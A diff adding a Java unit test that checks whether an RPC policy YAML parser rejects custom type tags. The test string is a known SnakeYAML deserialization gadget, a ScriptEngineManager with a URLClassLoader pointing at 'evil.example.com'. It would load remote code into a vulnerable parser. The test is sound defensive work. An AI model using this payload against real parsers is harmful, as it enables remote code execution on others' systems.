@@ -252,6 +252,19 @@ public class RpcPolicyParserTest {
   }
 
   /**
+   * Verifies that YAML containing a custom Java type tag is rejected by SafeConstructor, preventing
+   * arbitrary object deserialization.
+   */
+  @Test(expected = IllegalArgumentException.class)
+  public void shouldRejectYamlWithCustomJavaTypeTags() {
+    String malicious =
+        "defaultAction: !!javax.script.ScriptEngineManager"
+            + " [!!java.net.URLClassLoader"
+            + " [[!!java.net.URL [\"http://evil.example.com\"]]]]\n";
+    RpcPolicyParser.parseYaml(malicious);
+  }
+
+  /**
    * Verifies that a YAML rule missing the required {@code action} field causes an {@link
    * IllegalArgumentException} to be thrown.
    */
